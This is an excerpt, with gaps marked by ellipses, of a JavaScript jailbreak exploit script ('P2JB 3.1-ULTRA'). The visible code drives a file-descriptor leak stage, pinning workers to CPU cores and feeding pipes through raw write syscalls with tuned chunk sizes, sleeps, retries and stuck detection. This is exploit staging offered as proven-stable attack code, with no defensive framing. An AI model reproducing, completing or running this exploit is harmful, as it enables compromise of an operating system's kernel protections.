...
async function start_p2jb() {
    try {
        const p2jb_version = "P2JB 3.1-ULTRA+YT-DNS by ayed oraybi";
        ...
        const LEAK_CORES = [0, 1, 2, 3]; // v8.1: 4 cores (proven stable)
        ...
        async function prepare_fds(S) {
            ...
            for (let w = 0; w < NW; w++) {
                ...
                // v7.1: Pre-Warm Pipe - write initial data before next worker starts
                // This means each worker finds data already in its pipe = no idle time
                try {
                    var _pw_want = BigInt(Math.min(FEED_CHUNK, Number(normal_w / 100n)));
                    if (_pw_want > 8192n) _pw_want = 8192n; // safe initial warm
                    syscall(SYSCALL.write, BigInt(wfd), chunkbuf, _pw_want);
                    lws[w].queued = _pw_want; // track what we pre-wrote
            ...
            progress(8, "FD Leak: v8.5-LIGHT (4C@20ms)");
            if (typeof _dbg_log === 'function') {
                _dbg_log("FEED v8.4 START: " + lws.length + " workers, target=" + (Number(total_target)/1048576).toFixed(1) + "MB, cores=" + JSON.stringify(LEAK_CORES), "dbg-info");
            }
            await js_sleep(100);

            const FIXED_SLEEP = 20;    // v8.4: FIXED 20ms - stable & reliable
            const FIXED_CHUNK = 32768; // v8.4: FIXED 32KB - PROVEN STABLE
            let _feed_start = Date.now();
            const _feed_timeout = 600000;
            const _feed_max_retries = 5;
            let _feed_retry = 0;
            let all_fed = false;
            let _last_total = 0n;
            let _stuck_count = 0;
            ...
            while (!all_fed && _feed_retry < _feed_max_retries) {
                ...
                if (_pending.length > 0) {
                    ...
                    for (const lw of _pending) {
                        ...
                        for (let _attempt = 0; _attempt < 3 && !written; _attempt++) {
                            ...
                            if (_attempt > 0) {
                                await js_sleep(25); // v8.1: proven stable drain wait
                                want = want / 2n;
                                if (want < 1024n) want = 1024n;
                            }
                            ...
                            if (n > 0n && n <= BigInt(FEED_CHUNK)) {
                                ...
                                // EAGAIN (pipe full) - count silently, don't spam
                                _total_eagain++;
                                // Only count as real fail if it's NOT EAGAIN (-256)
                                if (n !== (-256n)) {
                                    _write_fail++;
                                }
                            } else {
                ...
                if (new_total === _last_total && !all_fed) {
                    ...
                    if (_stuck_count === 30 && typeof _dbg_log === 'function') {
                        _dbg_log("STUCK CRITICAL: " + _stuck_count + "/60 rounds until retry", "dbg-err");
                    }

                    // If completely stuck for too long, restart workers
                    if (_stuck_count > 60) { // v8.1: 60 rounds proven stable
                        _feed_retry++;
        ...
        // === v8.5 LIGHT: Minimal data tracking (no visual effects) ===
        var _live = {
            write_ok: 0, write_fail: 0,
            sleep_ms: 20, chunk_size: 32768,
            retry: 0, mb_sec: 0,
